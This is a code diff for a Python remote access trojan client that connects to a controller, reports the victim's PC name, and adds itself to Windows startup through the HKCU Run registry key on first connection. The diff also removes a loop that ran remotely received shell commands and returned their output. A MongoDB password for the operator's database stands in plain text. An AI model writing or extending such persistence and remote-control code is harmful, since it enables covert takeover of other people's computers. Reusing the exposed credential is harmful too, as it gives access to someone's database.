@@ -3,8 +3,11 @@ import os
 import socket
 import requests
 import threading
-
-
+import subprocess
+import shutil
+import winreg
+import sys
+import getpass
 
 password = "SB5aaHgp2IYtT72e"
 connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"
@@ -20,26 +23,61 @@ r = requests.get(url)
 client_ip = r.text
 
 
+def addToStartup(srcpath, filename, autostart: bool = True):
+    username = getpass.getuser()
+    dstpath = fr"C:\Users\{username}\{filename}"
+    shutil.copy(srcpath, dstpath)
+    print("copied!")
+    with winreg.OpenKey(
+            key=winreg.HKEY_CURRENT_USER,
+            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
+            reserved=0,
+            access=winreg.KEY_ALL_ACCESS,
+    ) as key:
+        try:
+            if autostart:
+                winreg.SetValueEx(key, filename, 0, winreg.REG_SZ, dstpath)
+            else:
+                winreg.DeleteValue(key, filename)
+        except OSError:
+            print("error!")
+            return False
+    if autostart == True:
+        s.send(bytes("file succesfully added to startup!", "utf-8"))
+        print("added!")
+    elif autostart == False:
+        s.send(bytes("file succesfully removed from startup!", "utf-8"))
+        print("deleted!")
+    return True
 
 
 def main():
+
     print("connected")
     while True:
-        msg = client.recv(1024).decode("utf-8")
+        msg = s.recv(1024).decode("utf-8")
         if msg == "/shell":
-                while 1:
-                    command = s.recv(1024).decode()
-                    if command.lower() == 'exit' :
-                        break
-                    if command == 'cd':
-                        os.chdir(command[3:].decode('utf-8'))
-                        dir = os.getcwd()
-                        dir1 = str(dir)
-                        s.send(dir1.encode())
-                    output = subprocess.getoutput(command)
-                    s.send(output.encode())
-                    if not output:
-                        self.errorsend()
+            print("sex")
+        elif "addToStartup" in msg:
+            x = msg.split()
+            for item in x:
+                if "path=" in item:
+                    path = item.replace("path=", "")
+                elif "filename=" in item:
+                    filename = item.replace("filename=", "")
+                elif "add=" in item:
+                    adding = item.replace("add=", "")
+
+            print(path, filename, adding)
+            if adding == "True":
+                addToStartup(path, filename, True)
+            elif adding == "False":
+                addToStartup(path, filename, False)
+
+        else:
+            print(msg)
+
+
 
 
 
@@ -50,12 +88,13 @@ def connecting(ip, port):
         s.connect((ip, port))
         threading.Thread(target = main, args=()).start()
 
+
     except:
         print("connection error")
         print(ip, port)
        
         return()
-
+    s.send(bytes(f"{pcname}", "utf-8"))
 
 
 
@@ -84,6 +123,11 @@ if info_list["first_connection?"] == True:
     port = x["port"]
     print(ip, port)
     connecting(ip, int(port))
+
+    curpath = os.getcwd() + "/" + sys.argv[0]
+    script_name = sys.argv[0]
+    addToStartup(curpath, script_name, True)
+
 
 else:
     
